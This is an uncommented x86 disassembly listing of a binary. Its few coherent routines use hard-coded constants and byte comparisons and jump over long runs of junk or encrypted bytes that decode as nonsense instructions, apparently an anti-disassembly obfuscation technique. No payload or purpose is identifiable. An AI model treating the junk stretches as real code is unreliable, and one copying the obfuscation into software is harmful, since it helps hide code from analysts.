  414096:	sbb    DWORD PTR [edx+eax*4-0x69],0xffffff98
  41409b:	push   ebx
  41409c:	inc    ebx
  41409d:	sti    
  41409e:	mov    eax,gs
  4140a0:	jb     0x4140c2
  4140a2:	retf   0xca52
  4140a5:	pop    eax
  4140a6:	push   cs
  4140a7:	enter  0x3152,0xf9
  4140ab:	lods   eax,DWORD PTR ds:[esi]
  4140ac:	xchg   esp,eax
  4140ad:	repz (bad) 
  4140b0:	loopne 0x414112
  4140b2:	fwait
  4140b3:	aaa    
  4140b4:	pop    edx
  4140b5:	pop    edi
  4140b6:	dec    edi
  4140b7:	xchg   ecx,edx
  4140b9:	pop    ebp
  4140ba:	xor    eax,0xe1e9cec8
  4140bf:	pop    ebx
  4140c0:	jae    0x4140d2
  4140c2:	lods   al,BYTE PTR ds:[esi]
  4140c3:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4140c5:	push   edi
  4140c6:	mov    DWORD PTR [ebp-0x3c],esi
  4140c9:	mov    eax,DWORD PTR [ebp-0x48]
  4140cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4140cf:	push   0xae0404d3
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x4220b1
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [esi+eax*2+0x1a]
  414159:	mov    ch,0x7c
  41415b:	sbb    ch,BYTE PTR [eax+ebx*1]
  41415e:	sbb    al,dl
  414160:	adc    bl,BYTE PTR [eax]
  414162:	sbb    BYTE PTR [esi],al
  414164:	push   edi
  414165:	jle    0x414147
  414167:	sahf   
  414168:	jb     0x414131
  41416a:	shl    DWORD PTR [esi],1
  41416c:	cs imul edi,ebp,0xffffff85
  414170:	mov    ebx,0xf27e8665
  414175:	push   0x296c96ca
  41417a:	or     cl,dl
  41417c:	push   ss
  41417d:	ss push ds
  41417f:	jg     0x414158
  414181:	pop    eax
  414182:	rcl    BYTE PTR [edi],cl
  414184:	addr16 push 0x1affeadc
  41418a:	inc    eax
  41418b:	retf   0x3b93
  41418e:	xchg   ah,bh
  414190:	arpl   WORD PTR [ecx+0x39388162],si
  414196:	loop   0x4141ad
  414198:	into   
  414199:	aad    0x55
  41419b:	arpl   WORD PTR [eax+ecx*4-0x495fdb65],ax
  4141a2:	scas   eax,DWORD PTR es:[edi]
  4141a3:	add    ah,ah
  4141a5:	addr16 retf 
  4141a7:	sbb    BYTE PTR [edx],al
  4141a9:	mov    esp,0x14aadac2
  4141ae:	push   ds
  4141af:	ss push eax
  4141b1:	sub    eax,DWORD PTR [ecx-0x19]
  4141b4:	(bad)  
  4141b5:	cli    
  4141b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141b7:	sbb    dh,BYTE PTR es:[edi-0x6b]
  4141bb:	call   0xfdad55dc
  4141c0:	mov    ebp,0x5ba45396
  4141c5:	push   ebx
  4141c6:	ja     0x4141e3
  4141c8:	sbb    DWORD PTR [ecx],ebp
  4141ca:	pop    es
  4141cb:	in     al,dx
  4141cc:	nop    DWORD PTR [esi+0x77]
  4141d0:	retf   
  4141d1:	out    dx,al
  4141d2:	mov    edx,0x8f7a6697
  4141d7:	cmp    eax,0xd8922f70
  4141dc:	inc    ecx
  4141dd:	add    eax,0xff069151
  4141e2:	mov    edx,0xecbd745a
  4141e7:	std    
  4141e8:	pushf  
  4141e9:	fcom   st(1)
  4141ec:	sbb    esp,0xffffff95
  4141ef:	jg     0x4141d6
  4141f1:	leave  
  4141f2:	pop    ds
  4141f3:	xchg   esi,eax
  4141f4:	inc    ecx
  4141f5:	xchg   esi,eax
  4141f6:	cmp    edx,DWORD PTR [ebx]
  4141f8:	sbb    eax,0xcaed2f51
  4141fd:	xchg   esi,eax
  4141fe:	cdq    
  4141ff:	jl     0x4141a9
  414201:	scas   al,BYTE PTR es:[edi]
  414202:	fisttp WORD PTR [ebp+0x4ee4907a]
  414208:	out    0x3b,eax
  41420a:	cmp    dh,BYTE PTR [ecx+0x37]
  41420d:	mov    ch,0x6e
  41420f:	in     eax,0x1d
  414211:	stc    
  414212:	pop    es
  414213:	sbb    BYTE PTR [edi+ecx*8+0x74],cl
  414217:	cmp    BYTE PTR [eax],0xbd
  41421a:	mov    al,0xe5
  41421c:	inc    esi
  41421e:	mov    bh,0x52
  414220:	inc    esp
  414221:	dec    eax
  414222:	test   eax,0xa54050b7
  414227:	(bad)  
  414228:	mov    esi,0x12c27c1d
  41422d:	cmp    eax,0x3bcb099e
  414232:	jnp    0x414216
  414234:	mov    al,0x45
  414236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414237:	fistp  QWORD PTR [ecx+ebp*1-0x1023c71c]
  41423e:	and    dh,BYTE PTR [edi+0x3b]
  414241:	cmp    DWORD PTR [edi],edi
  414243:	xor    al,0x1d
  414245:	mov    eax,0x4f712e0e
  41424a:	cmp    bh,BYTE PTR [eax-0x2a]
  41424d:	jo     0x4141e6
  41424f:	gs mov ebp,0xb8e9cff
  414255:	mov    bl,0x14
  414257:	stos   DWORD PTR es:[edi],eax
  414258:	cmp    BYTE PTR [ecx-0x6],al
  41425b:	sahf   
  41425c:	sbb    al,0xf
  41425e:	jno    0x4141e8
  414260:	stos   DWORD PTR es:[edi],eax
  414261:	das    
  414262:	jae    0x414202
  414264:	es or  al,0x2
  414267:	test   DWORD PTR [eax+0xf],edi
  41426a:	retf   0x86b
  41426d:	pop    esp
  41426e:	repnz fist DWORD PTR [eax-0x7ac1ef22]
  414275:	outs   dx,BYTE PTR ds:[esi]
  414276:	std    
  414277:	lea    edi,[esi-0x7d39c70b]
  41427d:	mov    BYTE PTR [ebp+0x577a19f1],dh
  414283:	jno    0x41424e
  414285:	xchg   esi,eax
  414286:	dec    eax
  414287:	mov    ebx,0x3f2445e2
  41428c:	adc    BYTE PTR [ecx-0x448f989f],al
  414292:	or     dh,bh
  414294:	pop    ecx
  414295:	in     eax,0xf3
  414297:	pop    ecx
  414298:	jb     0x4142e4
  41429a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41429b:	pusha  
  41429c:	add    al,0x80
  41429e:	inc    esi
  41429f:	cmp    BYTE PTR [esi+0x25551e80],al
  4142a5:	mov    cl,0x9c
  4142a7:	mov    al,ds:0x5ae98dca
  4142ac:	daa    
  4142ad:	xchg   ebp,eax
  4142ae:	inc    ebp
  4142af:	bound  ebx,QWORD PTR [ebp+0x17]
  4142b2:	outs   dx,DWORD PTR ds:[esi]
  4142b3:	push   ecx
  4142b4:	add    BYTE PTR [ebx+eiz*2],bl
  4142b7:	push   ebp
  4142b8:	and    ebx,DWORD PTR [edi]
  4142ba:	int3   
  4142bb:	(bad)  
  4142bc:	neg    esp
  4142be:	int3   
  4142bf:	aam    0xf8
  4142c1:	mov    ah,0xe2
  4142c3:	jecxz  0x414304
  4142c5:	push   eax
  4142c6:	shl    BYTE PTR [edx+ebp*2-0x5556b7fb],0xf1
  4142ce:	mov    ebx,0x22c8b88c
  4142d3:	xchg   edx,eax
  4142d4:	not    DWORD PTR [eax-0x2a7595f4]
  4142da:	lea    ebp,[esi-0x35]
  4142dd:	icebp  
  4142de:	loopne 0x41426f
  4142e0:	push   0xffffffdd
  4142e2:	push   edx
  4142e3:	jle    0x4142f0
  4142e5:	aas    
  4142e6:	inc    ebx
  4142e7:	add    BYTE PTR [edi-0x18],bh
  4142ea:	mov    ecx,DWORD PTR [ecx]
  4142ec:	add    BYTE PTR [ebp+0x5f],ah
  4142ef:	call   ebx
  4142f1:	cld    
  4142f2:	sub    eax,0x9ae7b8b9
  4142f7:	xlat   BYTE PTR ds:[ebx]
  4142f8:	(bad)  
  4142f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142fa:	data16 jae 0x414301
  4142fd:	mov    esp,0x2205f473
  414302:	pop    esi
  414303:	cld    
  414304:	rcr    BYTE PTR [esi-0x19],cl
  414307:	dec    edx
  414308:	test   DWORD PTR [ebp+0x7f],esi
  41430b:	data16 adc al,0x1c
  41430e:	in     al,0xa1
  414310:	inc    ebx
  414311:	ds inc ecx
  414313:	sar    BYTE PTR [eax],0x92
  414316:	jge    0x414349
  414318:	push   0x9377e2a7
  41431d:	rcl    esp,0xf8
  414320:	outs   dx,BYTE PTR ds:[esi]
  414321:	sub    al,0x98
  414323:	sbb    BYTE PTR [ebx-0x234ac130],dl
  414329:	addr16 shr ecx,1
  41432c:	imul   eax,DWORD PTR [eax+0x38],0x65
  414330:	mov    ebp,0xc06d54ad
  414335:	or     al,0x49
  414337:	js     0x414313
  414339:	rol    DWORD PTR [ebp-0x38daf409],cl
  41433f:	fdivr  st(1),st
  414341:	aas    
  414342:	xchg   BYTE PTR [edx+ebp*1+0x44],al
  414346:	xchg   ebp,edi
  414348:	or     DWORD PTR [ebx-0x1241c1d4],0xffffffc7
  41434f:	xchg   ebp,eax
  414350:	dec    edx
  414351:	mov    DWORD PTR [ebp+0x4e],eax
  414354:	mov    ecx,0xef51d0f3
  414359:	std    
  41435a:	sbb    ebx,esi
  41435c:	dec    ecx
  41435d:	adc    DWORD PTR fs:[esi+0x37e9a949],esp
  414364:	add    eax,0x88c66223
  414369:	jne    0x41439b
  41436b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41436c:	ja     0x41432d
  41436e:	mov    bl,0x92
  414370:	ins    DWORD PTR es:[edi],dx
  414371:	mov    al,ds:0xd016b4ec
  414376:	and    BYTE PTR [esi+0x1a0ca7c6],bl
  41437c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41437d:	jns    0x414307
  41437f:	in     eax,0xfb
  414381:	cmp    eax,0xfc994b4d
  414386:	shr    DWORD PTR [edx],1
  414388:	jmp    0x4482ac01
  41438d:	and    ebx,esp
  41438f:	sbb    eax,0x2c529aa2
  414394:	mov    ebx,0x73a08004
  414399:	inc    eax
  41439a:	mov    bh,0xfc
  41439c:	jecxz  0x414333
  41439e:	mov    ecx,0x1b7c1299
  4143a3:	stos   BYTE PTR es:[edi],al
  4143a4:	outs   dx,BYTE PTR ds:[esi]
  4143a5:	je     0x4143df
  4143a7:	jle    0x4143cd
  4143a9:	cmp    bl,ah
  4143ab:	inc    eax
  4143ac:	add    dl,BYTE PTR [edi]
  4143ae:	jp     0x414380
  4143b0:	mul    DWORD PTR [edi+0xa]
  4143b3:	mov    ds:0x51909579,eax
  4143b8:	jmp    0x4143f2
  4143ba:	adc    DWORD PTR [ebp+0x6f],ecx
  4143bd:	in     al,0x36
  4143bf:	idiv   BYTE PTR [edi+esi*1-0x4]
  4143c3:	test   BYTE PTR [edx+0x4e50363c],dl
  4143c9:	stc    
  4143ca:	push   ebp
  4143cb:	push   es
  4143cc:	xchg   esp,eax
  4143cd:	loop   0x4143c7
  4143cf:	push   esi
  4143d0:	cmp    esi,DWORD PTR [eax]
  4143d2:	mov    bl,0x5d
  4143d4:	lods   eax,DWORD PTR ds:[esi]
  4143d5:	mov    eax,0xd7fbbd0f
  4143da:	inc    eax
  4143db:	dec    esp
  4143dc:	pop    esp
  4143dd:	leave  
  4143de:	cmp    ecx,DWORD PTR [esi+eax*2+0x2329a27]
  4143e5:	das    
  4143e6:	cmc    
  4143e7:	add    dh,BYTE PTR [edi-0x671823c4]
  4143ed:	add    ch,BYTE PTR [edi]
  4143ef:	mov    al,0xf6
  4143f1:	push   ebp
  4143f2:	dec    esp
  4143f3:	inc    edx
  4143f4:	je     0x414415
  4143f6:	out    dx,al
  4143f7:	pop    ds
  4143f8:	mov    ch,0xf1
  4143fa:	jmp    0x414457
  4143fc:	scas   al,BYTE PTR es:[edi]
  4143fd:	mov    bh,0x67
  4143ff:	pushf  
  414400:	xor    eax,0xf107bbfb
  414405:	sub    BYTE PTR [edi],dh
  414407:	xchg   esi,eax
  414408:	and    al,0x4e
  41440a:	mov    dh,0x74
  41440c:	add    ecx,esp
  41440e:	test   DWORD PTR [eax],esi
  414410:	out    0xde,eax
  414412:	jl     0x4143ea
  414414:	jns    0x4143d6
  414416:	and    dh,cl
  414418:	cwde   
  414419:	inc    ebx
  41441a:	rcl    BYTE PTR [eax],0xfe
  41441d:	fidivr WORD PTR [ecx+0x50c86572]
  414423:	aas    
  414424:	push   ebx
  414425:	test   al,0x3b
  414427:	ss xchg ebx,eax
  414429:	push   eax
  41442a:	add    al,0x31
  41442c:	mov    esi,0x71476987
  414431:	stc    
  414432:	lock addr16 push es
  414435:	mov    al,0xef
  414437:	sti    
  414438:	mov    WORD PTR [eax],ds
  41443a:	mov    BYTE PTR [ebx+0x2a04c38c],ch
  414440:	adc    al,0x6a
  414442:	mov    fs,WORD PTR [esp+ebx*1]
  414445:	mov    dh,0xd1
  414447:	cmp    cx,WORD PTR [edx-0x29]
  41444b:	aaa    
  41444c:	mov    dh,0x8a
  41444e:	mov    esi,0x9bbcc694
  414453:	aas    
  414454:	or     al,0xd6
  414456:	shl    edi,0x89
  414459:	push   0x19
  41445b:	rol    dh,1
  41445d:	clc    
  41445e:	hlt    
  41445f:	fcomp  QWORD PTR [edx+0x49]
  414462:	cmp    BYTE PTR [esi],0xd2
  414465:	iret   
  414466:	jne    0x414478
  414468:	ret    0x4852
  41446b:	and    ecx,DWORD PTR [eax+0x70e074cd]
  414471:	sub    BYTE PTR [esi-0xe854259],ch
  414477:	xlat   BYTE PTR ds:[ebx]
  414478:	push   esp
  414479:	mov    al,0x94
  41447b:	add    ah,BYTE PTR [ebp+0x13]
  41447e:	inc    ecx
  41447f:	hlt    
  414480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414481:	mov    al,ds:0xa0c45914
  414486:	xchg   ecx,eax
  414487:	sub    al,0xe4
  414489:	(bad)  
  41448a:	outs   dx,BYTE PTR ds:[esi]
  41448b:	out    0x51,al
  41448d:	(bad)  
  41448e:	sbb    ebp,DWORD PTR [eax+0x3b3f02f6]
  414494:	and    BYTE PTR [eax+0x7dc6ca59],bl
  41449a:	push   ecx
  41449b:	nop
  41449c:	scas   eax,DWORD PTR es:[edi]
  41449d:	mov    ah,0x4b
  41449f:	push   ds
  4144a0:	adc    BYTE PTR [esi+0x61],0x2
  4144a4:	push   0xffffffd6
  4144a6:	mov    bl,0x6c
  4144a8:	hlt    
  4144a9:	adc    BYTE PTR [ebx],0x9f
  4144ac:	fcmovnu st,st(5)
  4144ae:	fdiv   QWORD PTR [edx+0x23]
  4144b1:	sar    BYTE PTR [ecx],0x3d
  4144b4:	sub    ax,0xdedd
  4144b8:	xchg   BYTE PTR [esi-0x52a33f6e],dh
  4144be:	pop    ecx
  4144bf:	outs   dx,DWORD PTR ds:[esi]
  4144c0:	out    0xb6,eax
  4144c2:	push   edx
  4144c3:	pop    edi
  4144c4:	xchg   DWORD PTR [ebx],ecx
  4144c6:	je     0x41450e
  4144c8:	adc    DWORD PTR [edi+0x20],ecx
  4144cb:	arpl   WORD PTR [ecx],bp
  4144cd:	pop    esp
  4144ce:	sti    
  4144cf:	sub    al,0xaa
  4144d1:	call   0xe42f5163
  4144d6:	mov    al,0x9
  4144d8:	jmp    0x293af14
  4144dd:	mov    gs,WORD PTR [edx]
  4144df:	inc    esi
  4144e0:	push   es
  4144e1:	jo     0x4144b5
  4144e3:	imul   ebp,ecx,0x4b
  4144e6:	cdq    
  4144e7:	push   ebx
  4144e8:	add    BYTE PTR [esi+0x50587bc5],dh
  4144ee:	sub    BYTE PTR [edx],bl
  4144f0:	xor    BYTE PTR [edx+0x60],bh
  4144f3:	ds pop ecx
  4144f5:	jne    0x4144f4
  4144f7:	ja     0x41447d
  4144f9:	and    ah,bl
  4144fb:	sbb    cl,BYTE PTR [edi-0x7b]
  4144fe:	ss xor al,0xa7
  414501:	push   0x54db70f7
  414506:	mov    ch,0xa7
  414508:	and    esi,DWORD PTR [ebp+0x62]
  41450b:	mov    DWORD PTR [ebp-0x8],0x3204
  414512:	mov    DWORD PTR [ebp-0x4],0x62ea
  414519:	mov    DWORD PTR [ebp-0x38],0x58e9
  414520:	mov    DWORD PTR [ebp-0x34],0x7f89
  414527:	mov    DWORD PTR [ebp-0x30],0x7fda
  41452e:	mov    DWORD PTR [ebp-0x2c],0x2889
  414535:	mov    DWORD PTR [ebp-0x28],0xf0f
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0xd37c:0x73623c4c
  414595:	mov    esi,0x24d2aae9
  41459a:	sbb    BYTE PTR [eax],bl
  41459c:	rcl    BYTE PTR [edx],1
  41459e:	sbb    BYTE PTR [eax],bl
  4145a0:	fld    st(5)
  4145a2:	push   ecx
  4145a3:	sub    DWORD PTR [esi-0x1e],ecx
  4145a6:	stos   DWORD PTR es:[edi],eax
  4145a7:	sub    BYTE PTR [esi+0x59],0x84
  4145ab:	mov    al,0x62
  4145ad:	push   ss
  4145ae:	iret   
  4145af:	inc    ebx
  4145b0:	add    eax,0xcf1b85b2
  4145b5:	dec    eax
  4145b6:	mul    ch
  4145b8:	and    edi,DWORD PTR [esi+0x1172480c]
  4145be:	mov    cs,esp
  4145c0:	mov    esp,0xd49757e
  4145c5:	push   0xffffffc1
  4145c7:	mov    esp,0xa8c55a6c
  4145cc:	or     esp,0x8cf66000
  4145d2:	push   ecx
  4145d3:	dec    esi
  4145d4:	jge    0x414613
  4145d6:	ror    DWORD PTR [ecx-0x43],0xcb
  4145da:	cwd    
  4145dc:	xchg   ebp,eax
  4145dd:	ja     0x414561
  4145df:	test   DWORD PTR [esi+0x77ec64bb],esi
  4145e5:	(bad)  
  4145e6:	pop    ecx
  4145e7:	sub    esp,esi
  4145e9:	push   0xef580e32
  4145ee:	or     ecx,esi
  4145f0:	push   es
  4145f1:	inc    edi
  4145f2:	dec    eax
  4145f3:	mov    al,0xfa
  4145f5:	test   BYTE PTR [edx-0x3df785e1],dh
  4145fb:	adc    eax,0xaa27c5ab
  414600:	or     al,0x16
  414602:	ds jmp 0x5640355e
  414608:	ret    
  414609:	adc    esp,DWORD PTR [eax]
  41460b:	mov    eax,ds:0xe5734b8b
  414610:	add    al,0x4b
  414612:	lock (bad) 
  414614:	or     esi,eax
  414616:	ins    DWORD PTR es:[edi],dx
  414617:	inc    eax
  414618:	sub    al,0x7c
  41461a:	mov    ebp,0xd70d2eb8
  41461f:	in     eax,0x21
  414621:	and    al,0x6d
  414623:	adc    BYTE PTR [edx],ah
  414625:	inc    esp
  414626:	xlat   BYTE PTR ds:[ebx]
  414627:	mov    ch,dl
  414629:	and    eax,ebp
  41462b:	(bad)  
  41462c:	div    BYTE PTR [edi-0x54]
  41462f:	mov    ecx,0x3558eb11
  414634:	mov    ds:0xd04fd255,al
  414639:	jecxz  0x4145f7
  41463b:	sbb    eax,DWORD PTR [edx-0x4b879d9c]
  414641:	mov    esi,0x84a33f3c
  414646:	xor    esi,0xffffffcb
  414649:	in     eax,dx
  41464a:	mov    bl,BYTE PTR [esp+edx*2+0x3a]
  41464e:	add    eax,0x8cb69658
  414653:	outs   dx,DWORD PTR ds:[esi]
  414654:	jecxz  0x4146b2
  414656:	(bad)  
  414657:	push   ebp
  414658:	ins    DWORD PTR es:[edi],dx
  414659:	pop    esi
  41465a:	scas   al,BYTE PTR es:[edi]
  41465b:	les    eax,FWORD PTR ds:0x54440be2
  414661:	pop    edi
  414662:	fst    QWORD PTR [esi+ebx*8+0x75868152]
  414669:	imul   esp,DWORD PTR [edi-0xa8490df],0xfffffffc
  414670:	jl     0x4145f7
  414672:	mov    al,dl
  414674:	ret    
  414675:	scas   al,BYTE PTR es:[edi]
  414676:	add    BYTE PTR [edx-0x2e],0x1b
  41467a:	cmp    BYTE PTR [esi-0x36486adc],bl
  414680:	and    al,0xb7
  414682:	pop    esi
  414683:	popa   
  414684:	mov    esi,0x24c201ad
  414689:	xchg   ecx,eax
  41468a:	mov    ah,0xa1
  41468c:	ror    BYTE PTR [edx+edi*2+0x72653f60],1
  414693:	mov    edi,0x51a4f695
  414698:	arpl   WORD PTR [ebx+0x59],sp
  41469b:	push   ds
  41469c:	fidivr WORD PTR [ebx-0x14]
  41469f:	cld    
  4146a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146a1:	stc    
  4146a2:	fbld   TBYTE PTR [edx]
  4146a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146a5:	push   ebx
  4146a6:	sub    BYTE PTR [edx+0x54],dh
  4146a9:	jmp    0xeafb8f5a
  4146ae:	and    ch,bh
  4146b0:	dec    edi
  4146b1:	jns    0x41469a
  4146b3:	pop    ebp
  4146b4:	test   al,0x73
  4146b6:	pop    edi
  4146b7:	or     dh,BYTE PTR [edi+0x3a89ba1f]
  4146bd:	xchg   esi,eax
  4146be:	add    DWORD PTR [edx+0x577b7df],ebx
  4146c4:	adc    bl,BYTE PTR [esi]
  4146c6:	mov    eax,0xb210eebb
  4146cb:	sar    edx,1
  4146cd:	mov    esi,0xff4b71b4
  4146d2:	xor    esi,edi
  4146d4:	jmp    0x4146de
  4146d6:	mov    DWORD PTR [esi],esp
  4146d8:	cs loope 0x41470d
  4146db:	daa    
  4146dc:	and    DWORD PTR [edx],edi
  4146de:	clc    
  4146df:	xchg   DWORD PTR [ebp+0x28e8c655],edi
  4146e5:	jbe    0x4146d5
  4146e7:	pushf  
  4146e8:	sub    esp,DWORD PTR [ecx]
  4146ea:	dec    ebx
  4146eb:	mov    cl,BYTE PTR [eax]
  4146ed:	jb     0x414723
  4146ef:	loop   0x4146ca
  4146f1:	int    0x2
  4146f3:	xor    al,0x0
  4146f5:	cli    
  4146f6:	inc    ecx
  4146f7:	mov    edi,0x60409506
  4146fc:	push   edx
  4146fd:	out    0x3d,eax
  4146ff:	mov    ebx,0x9288c888
  414704:	xor    DWORD PTR [edi+0x6d],edx
  414707:	add    ch,BYTE PTR [ebp-0x11]
  41470a:	repz adc DWORD PTR [esi-0x44],0xffffff86
  41470f:	outs   dx,BYTE PTR ds:[esi]
  414710:	fcmovnu st,st(4)
  414712:	jge    0x4146dc
  414714:	cmp    al,0x32
  414716:	(bad)  
  414717:	mov    esp,0xcfaa2e5a
  41471c:	(bad)  
  41471d:	mov    eax,0x8439928d
  414722:	sbb    eax,0xda1e4686
  414727:	pop    ebx
  414728:	push   eax
  414729:	fistp  QWORD PTR [esp+eax*4]
  41472c:	jle    0x4146e3
  41472e:	xchg   ebp,eax
  41472f:	scas   al,BYTE PTR es:[edi]
  414730:	jns    0x4146cb
  414732:	or     DWORD PTR [ebp+0x7],esi
  414735:	lahf   
  414736:	jmp    0x6cec:0xdead7797
  41473d:	psubq  mm2,mm0
  414740:	sub    al,BYTE PTR [edi-0x38981341]
  414746:	fld    TBYTE PTR [edi]
  414748:	jne    0x414720
  41474a:	mov    dh,0x62
  41474c:	pop    esi
  41474d:	inc    ecx
  41474e:	test   DWORD PTR [ebp-0x18],ecx
  414751:	pop    ds
  414752:	ror    BYTE PTR ds:0xf7fbce2e,1
  414758:	imul   esp,DWORD PTR [edx],0x4629703a
  41475e:	xchg   ecx,edi
  414760:	rcl    DWORD PTR [ebx-0x2d],0xb3
  414764:	fisubr WORD PTR [ebp-0x41180ac1]
  41476a:	in     al,dx
  41476b:	rcr    BYTE PTR [ecx],0x99
  41476e:	outs   dx,DWORD PTR ds:[esi]
  41476f:	cmc    
  414770:	pop    ecx
  414771:	mov    ebp,0xdae0381a
  414776:	into   
  414777:	aaa    
  414778:	jne    0x4147de
  41477a:	sar    DWORD PTR [ebx],1
  41477c:	mov    esi,DWORD PTR [ecx+0x2b]
  41477f:	and    DWORD PTR ds:0xbd1f4723,edi
  414785:	adc    BYTE PTR ds:0x5d6b57a7,0xe0
  41478c:	inc    ebx
  41478d:	lods   eax,DWORD PTR ds:[esi]
  41478e:	dec    ebx
  41478f:	fidiv  WORD PTR [edx]
  414791:	das    
  414792:	int    0xf2
  414794:	lock jge 0x4147b0
  414797:	mov    dl,0xcd
  414799:	out    0x47,eax
  41479b:	shl    DWORD PTR [ebx+edx*8+0x3b],cl
  41479f:	inc    eax
  4147a0:	adc    DWORD PTR [eax],eax
  4147a2:	dec    esi
  4147a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147a4:	xor    eax,0x927be13c
  4147a9:	jp     0x4147bd
  4147ab:	rcr    DWORD PTR [ecx+0x58],0x2f
  4147af:	mov    bh,0xdd
  4147b1:	cmp    al,BYTE PTR ds:0xe8755eea
  4147b7:	test   al,0xbe
  4147b9:	(bad)  
  4147ba:	repz dec edi
  4147bc:	mov    al,0x72
  4147be:	jmp    0xec87:0x5151e47b
  4147c5:	push   ds
  4147c6:	aad    0x48
  4147c8:	scas   al,BYTE PTR es:[edi]
  4147c9:	enter  0x20e8,0x87
  4147cd:	inc    ecx
  4147ce:	mov    eax,ss:0xa25ead0c
  4147d4:	or     eax,0x314a1996
  4147d9:	or     edx,ebp
  4147db:	dec    eax
  4147dc:	adc    eax,0xe89bfaf1
  4147e1:	push   eax
  4147e2:	jns    0x414781
  4147e4:	and    al,0x52
  4147e6:	loop   0x41478e
  4147e8:	and    al,ah
  4147ea:	inc    ecx
  4147eb:	mov    edx,0xa1730d67
  4147f0:	and    dh,ah
  4147f2:	fild   QWORD PTR [edi-0x7a]
  4147f5:	in     eax,0x21
  4147f7:	ret    
  4147f8:	js     0x4147a3
  4147fa:	xor    ebp,DWORD PTR [esi+ebx*1+0x63]
  4147fe:	sbb    al,0xe6
  414800:	push   eax
  414801:	mov    DWORD PTR [esi-0x54b38d80],ecx
  414807:	or     dl,al
  414809:	in     al,0x62
  41480b:	rcr    DWORD PTR [ebx+0xd],cl
  41480e:	out    dx,eax
  41480f:	or     eax,0xd7b6185f
  414814:	push   ebp
  414816:	inc    esi
  414817:	push   es
  414818:	mov    BYTE PTR [edi-0x45],bl
  41481b:	push   esp
  41481c:	je     0x4147fc
  41481e:	xlat   BYTE PTR ds:[ebx]
  41481f:	int3   
  414820:	lock jne 0x414837
  414823:	stos   BYTE PTR es:[edi],al
  414824:	jecxz  0x4147b3
  414826:	mov    ah,0x94
  414828:	adc    edi,DWORD PTR [ebx]
  41482a:	inc    esi
  41482b:	inc    ebp
  41482c:	jb     0x4147bb
  41482e:	loopne 0x4148ab
  414830:	(bad)  
  414831:	or     al,0xf0
  414833:	mov    ebx,0xee7496e9
  414838:	aad    0x7e
  41483a:	mov    eax,0x2b735885
  41483f:	lds    eax,FWORD PTR [edi+0x59fe5b46]
  414845:	push   ds
  414846:	xchg   ebx,eax
  414847:	sahf   
  414848:	outs   dx,DWORD PTR ds:[esi]
  414849:	xchg   esp,eax
  41484a:	call   0x2184f53e
  41484f:	fdivr  QWORD PTR [edi]
  414851:	hlt    
  414852:	rep lods eax,DWORD PTR ds:[esi]
  414854:	cmp    eax,0x5f683a8d
  414859:	scas   eax,DWORD PTR es:[edi]
  41485a:	loop   0x414868
  41485c:	adc    al,dh
  41485e:	adc    DWORD PTR [ebx+0x1b],ebx
  414861:	mov    eax,0x2c5e139c
  414866:	jge    0x414892
  414868:	pop    esi
  414869:	popa   
  41486a:	dec    ebx
  41486b:	and    DWORD PTR [edx],ecx
  41486d:	or     DWORD PTR [edx-0x2b490ce5],esp
  414873:	(bad)
  414877:	lock mov edx,0x50de7ede
